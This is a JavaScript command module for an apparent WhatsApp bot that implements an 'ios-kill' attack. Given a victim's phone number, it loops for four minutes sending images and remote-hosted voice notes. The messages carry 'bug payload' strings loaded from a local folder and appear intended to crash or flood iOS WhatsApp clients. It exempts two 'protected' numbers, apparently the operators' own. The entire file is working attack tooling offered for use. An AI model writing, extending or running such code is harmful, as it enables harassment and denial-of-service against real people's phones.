const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'ios-kill',
  desc: 'iOS only attack using image + audio payloads',
  category: 'bug',
  react: '📱',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'ios-kill') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}ios-kill <number>`
      }, { quoted: mek });
    }

    const blocked = ['13058962443', '50942241547'];
    if (blocked.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This iOS target is protected. Command aborted.',
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📂 No bug payloads found in /bugs folder.',
      }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `📱 *iOS-KILL Started!*\n🎯 Target: +${targetNumber}\n📦 Payloads: ${bugFiles.length}\n🕓 Duration: 4 minutes`,
    }, { quoted: mek });

    const endTime = Date.now() + 240000; // 4 minutes

    async function sendPayload(msg) {
      await bot.sendMessage(targetJid, {
        image: { url: path.resolve(__dirname, '../media/1.png') },
        caption: `📱 ${msg}\n_BY IOS-KILL SYSTEM_`,
      });

      await bot.sendMessage(targetJid, {
        audio: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
        mimetype: 'audio/mp4',
        ptt: true,
      });
    }

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async () => msg;
          }

          if (typeof bugPayload === 'function') {
            const result = await bugPayload(m, bot);
            if (Array.isArray(result)) {
              for (const line of result) {
                await sendPayload(line);
                await new Promise(res => setTimeout(res, 600));
              }
            } else if (typeof result === 'string') {
              await sendPayload(result);
              await new Promise(res => setTimeout(res, 600));
            }
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }
      }
    }

    await bot.sendMessage(from, {
      text: `✅ iOS-KILL complete on +${targetNumber}`,
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});